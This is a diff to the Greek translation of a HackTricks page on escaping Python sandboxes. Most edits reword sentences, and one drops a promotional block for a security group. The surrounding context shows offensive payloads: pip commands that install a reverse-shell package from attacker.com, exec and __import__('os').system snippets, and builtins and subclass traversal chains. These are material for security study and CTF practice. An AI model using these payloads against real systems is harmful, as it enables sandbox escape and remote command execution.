@@ -15,14 +15,6 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 Αυτές είναι μερικές τεχνικές για να παρακάμψετε τις προστασίες του python sandbox και να εκτελέσετε αυθαίρετες εντολές.
 
 ## Βιβλιοθήκες Εκτέλεσης Εντολών
@@ -93,14 +85,14 @@ print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 
 ### Πακέτο Pip
 
-Τέχνασμα που μοιράστηκε ο **@isHaacK**
+Τέχνασμα που μοιράστηκε από **@isHaacK**
 
 Εάν έχετε πρόσβαση στο `pip` ή `pip.main()`, μπορείτε να εγκαταστήσετε ένα αυθαίρετο πακέτο και να αποκτήσετε ένα reverse shell καλώντας:
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-Μπορείτε να κατεβάσετε το πακέτο για να δημιουργήσετε το reverse shell εδώ. Παρακαλώ, σημειώστε ότι πριν το χρησιμοποιήσετε θα πρέπει να **αποσυμπιέσετε, να αλλάξετε το `setup.py` και να βάλετε τη διεύθυνση IP σας για το reverse shell**:
+Μπορείτε να κατεβάσετε το πακέτο για να δημιουργήσετε το reverse shell εδώ. Παρακαλώ, σημειώστε ότι πριν το χρησιμοποιήσετε θα πρέπει να **αποσυμπιέσετε, να αλλάξετε το `setup.py`, και να βάλετε τη διεύθυνση IP σας για το reverse shell**:
 
 {% file src="../../../.gitbook/assets/Reverse.tar (1).gz" %}
 
@@ -114,7 +106,7 @@ pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 Σημειώστε ότι το exec επιτρέπει πολυγραμμικά strings και ";", αλλά το eval δεν το επιτρέπει (ελέγξτε τον τελεστή walrus)
 {% endhint %}
 
-Εάν ορισμένοι χαρακτήρες είναι απαγορευμένοι μπορείτε να χρησιμοποιήσετε την **hex/octal/B64** αναπαράσταση για να **bypass** τον περιορισμό:
+Αν ορισμένοι χαρακτήρες είναι απαγορευμένοι μπορείτε να χρησιμοποιήσετε την **hex/octal/B64** αναπαράσταση για να **bypass** τον περιορισμό:
 ```python
 exec("print('RCE'); __import__('os').system('ls')") #Using ";"
 exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
@@ -330,7 +322,7 @@ pass
 * [**Builtins functions of python2**](https://docs.python.org/2/library/functions.html)
 * [**Builtins functions of python3**](https://docs.python.org/3/library/functions.html)
 
-Αν μπορείτε να αποκτήσετε πρόσβαση στο **`__builtins__`** αντικείμενο μπορείτε να εισάγετε βιβλιοθήκες (σημειώστε ότι μπορείτε επίσης να χρησιμοποιήσετε εδώ άλλη αναπαράσταση συμβολοσειράς που εμφανίζεται στην τελευταία ενότητα):
+Αν μπορείτε να έχετε πρόσβαση στο **`__builtins__`** αντικείμενο μπορείτε να εισάγετε βιβλιοθήκες (σημειώστε ότι μπορείτε επίσης να χρησιμοποιήσετε εδώ άλλη αναπαράσταση συμβολοσειράς που εμφανίζεται στην τελευταία ενότητα):
 ```python
 __builtins__.__import__("os").system("ls")
 __builtins__.__dict__['__import__']("os").system("ls")
@@ -400,7 +392,7 @@ __builtins__["__import__"]("os").system("ls")
 ```
 ## Globals and locals
 
-Ο έλεγχος των **`globals`** και **`locals`** είναι ένας καλός τρόπος για να γνωρίζετε τι μπορείτε να αποκτήσετε πρόσβαση.
+Έλεγχος των **`globals`** και **`locals`** είναι ένας καλός τρόπος για να ξέρετε τι μπορείτε να αποκτήσετε πρόσβαση.
 ```python
 >>> globals()
 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
@@ -462,7 +454,7 @@ defined_func.__class__.__base__.__subclasses__()
 ```
 ### Εύρεση επικίνδυνων βιβλιοθηκών που έχουν φορτωθεί
 
-Για παράδειγμα, γνωρίζοντας ότι με τη βιβλιοθήκη **`sys`** είναι δυνατό να **εισαγάγετε αυθαίρετες βιβλιοθήκες**, μπορείτε να αναζητήσετε όλα τα **modules που έχουν φορτωθεί και περιέχουν την εισαγωγή του sys μέσα τους**:
+Για παράδειγμα, γνωρίζοντας ότι με τη βιβλιοθήκη **`sys`** είναι δυνατό να **εισαγάγετε αυθαίρετες βιβλιοθήκες**, μπορείτε να αναζητήσετε όλα τα **modules που έχουν φορτωθεί και έχουν εισάγει το sys μέσα τους**:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
@@ -525,7 +517,7 @@ builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalE
 pdb:
 """
 ```
-Επιπλέον, αν νομίζετε ότι **άλλες βιβλιοθήκες** μπορεί να είναι σε θέση να **καλέσουν συναρτήσεις για να εκτελέσουν εντολές**, μπορούμε επίσης να **φιλτράρουμε με βάση τα ονόματα συναρτήσεων** μέσα στις πιθανές βιβλιοθήκες:
+Επιπλέον, αν νομίζετε ότι **άλλες βιβλιοθήκες** μπορεί να είναι σε θέση να **καλέσουν συναρτήσεις για να εκτελέσουν εντολές**, μπορούμε επίσης να **φιλτράρουμε κατά ονόματα συναρτήσεων** μέσα στις πιθανές βιβλιοθήκες:
 ```python
 bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
 bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
@@ -678,7 +670,7 @@ print(SEARCH_FOR)
 if __name__ == "__main__":
 main()
 ```
-Μπορείτε να ελέγξετε την έξοδο αυτού του script σε αυτή τη σελίδα:
+You can check the output of this script on this page:
 
 {% content-ref url="https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md" %}
 [https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md](https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md)
@@ -741,7 +733,7 @@ return 'HAL 9000'
 [python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
 {% endcontent-ref %}
 
-### Payloads Ευαίσθητης Πληροφορίας
+### Payloads Αποκάλυψης Ευαίσθητων Πληροφοριών
 ```python
 {whoami.__class__.__dict__}
 {whoami.__globals__[os].__dict__}
@@ -755,7 +747,7 @@ return 'HAL 9000'
 ## Ανάλυση Αντικειμένων Python
 
 {% hint style="info" %}
-Αν θέλετε να **μάθετε** για τον **bytecode της python** σε βάθος, διαβάστε αυτή την **καταπληκτική** ανάρτηση για το θέμα: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+Αν θέλετε να **μάθετε** για τον **bytecode Python** σε βάθος, διαβάστε αυτή την **καταπληκτική** ανάρτηση για το θέμα: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 {% endhint %}
 
 Σε ορισμένα CTFs μπορεί να σας δοθεί το όνομα μιας **προσαρμοσμένης συνάρτησης όπου βρίσκεται η σημαία** και πρέπει να δείτε τα **εσωτερικά** της **συνάρτησης** για να την εξαγάγετε.
@@ -905,7 +897,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ```
 ## Συγκέντρωση Python
 
-Τώρα, ας φανταστούμε ότι με κάποιο τρόπο μπορείτε να **εκφορτώσετε τις πληροφορίες σχετικά με μια συνάρτηση που δεν μπορείτε να εκτελέσετε** αλλά **χρειάζεστε** να **την εκτελέσετε**.\
+Τώρα, ας φανταστούμε ότι με κάποιο τρόπο μπορείτε να **εκχύσετε τις πληροφορίες σχετικά με μια συνάρτηση που δεν μπορείτε να εκτελέσετε** αλλά **χρειάζεστε** να **την εκτελέσετε**.\
 Όπως στο παρακάτω παράδειγμα, μπορείτε να **έχετε πρόσβαση στο αντικείμενο κώδικα** αυτής της συνάρτησης, αλλά απλά διαβάζοντας την αποσυναρμολόγηση **δεν ξέρετε πώς να υπολογίσετε τη σημαία** (_φανταστείτε μια πιο σύνθετη συνάρτηση `calc_flag`_)
 ```python
 def get_flag(some_input):
@@ -1039,11 +1031,6 @@ print(f"\nNot a Super User!!!\n")
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-**Try Hard Security Group**
-
-<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
 Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
